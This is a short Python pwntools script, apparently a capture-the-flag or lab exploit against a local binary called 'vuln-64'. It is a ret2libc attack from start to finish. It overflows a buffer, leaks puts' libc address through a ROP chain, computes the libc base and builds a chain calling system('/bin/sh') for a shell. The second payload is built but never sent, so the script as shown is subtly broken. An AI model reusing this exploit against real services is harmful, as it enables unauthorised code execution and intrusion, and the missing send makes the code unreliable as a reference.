from pwn import *
import time
elf = context.binary = ELF("./vuln-64")
context.log_level = 'debug'
p = process()
libc = elf.libc
offset = 40
print(f"Attach to PID: {p.pid}")
rop = ROP(context.binary)
rdi = p64(rop.find_gadget(['pop rdi','ret'])[0])
plt_puts = p64(elf.plt['puts'])
plt_got = p64(elf.got['puts'])
main = p64(elf.sym['main'])
ret = p64(rop.find_gadget(['ret'])[0])
payload1 = b"A" * offset + rdi + plt_got + plt_puts + ret + main
p.sendline(payload1)
p.recvuntil(b"Come get me\n")
puts_leak = u64(p.recv(6).strip() + b'\x00\x00')
print(puts_leak)
puts_offset = libc.sym['puts']
libc.address = puts_leak - puts_offset
print(hex(libc.address))
system = p64(libc.sym['system'])
bin_sh = p64(next(libc.search(b'/bin/sh\x00')))
payload2 = b"A" * offset + ret + rdi + bin_sh  + system + p64(libc.sym['exit'])
p.interactive()
